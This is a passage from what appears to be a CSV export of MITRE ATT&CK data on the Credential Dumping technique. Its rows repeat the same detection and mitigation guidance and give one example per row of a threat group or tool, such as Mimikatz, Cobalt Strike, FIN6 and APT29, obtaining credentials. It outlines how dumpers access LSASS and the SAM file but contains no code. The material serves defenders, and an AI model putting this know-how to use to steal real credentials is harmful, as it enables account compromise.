tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
42,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0039|Suckfly]] used a signed credential-dumping tool to obtain victim account credentials.[[CiteRef::Symantec Suckfly May 2016]]'],['Suckfly'],['Suckfly'],['G0039'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
43,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Group/G0038|Stealth Falcon]] malware gathers passwords from multiple sources, including Windows Credential Vault, Internet Explorer, Firefox, Chrome, and Outlook.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]']",['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
44,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0154|Cobalt Strike]] can recover hashed passwords.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Cobalt Strike,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
45,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
46,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['Some [[Software/S0093|Backdoor.Oldrea]] samples contain a publicly available Web browser password recovery tool.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Backdoor.Oldrea, Havex",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
47,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0094|Trojan.Karagany]] can dump passwords and save them into <code>\\ProgramData\\Mail\\MailAg\\pwds.txt</code>.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Trojan.Karagany,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
48,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0005|Windows Credential Editor]] can dump credentials.[[CiteRef::Amplia WCE]]'],['FIN6'],['FIN6'],['G0037'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Windows Credential Editor, WCE",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
49,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","[u""[[Group/G0037|FIN6]] has used [[Software/S0005|Windows Credential Editor]] for credential dumping, as well as Metasploit\u2019s [[Software/S0029|PsExec]] NTDSGRAB module to obtain a copy of the victim's Active Directory database.[[CiteRef::FireEye FIN6 April 2016]]""]",['FIN6'],['FIN6'],['G0037'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
50,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['Password stealer and NTLM stealer modules in [[Software/S0046|CozyCar]] harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication. [[Software/S0046|CozyCar]] has also executed [[Software/S0002|Mimikatz]] for further victim penetration.[[CiteRef::F-Secure CozyDuke]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: CozyCar, CozyDuke, ...",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
51,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential 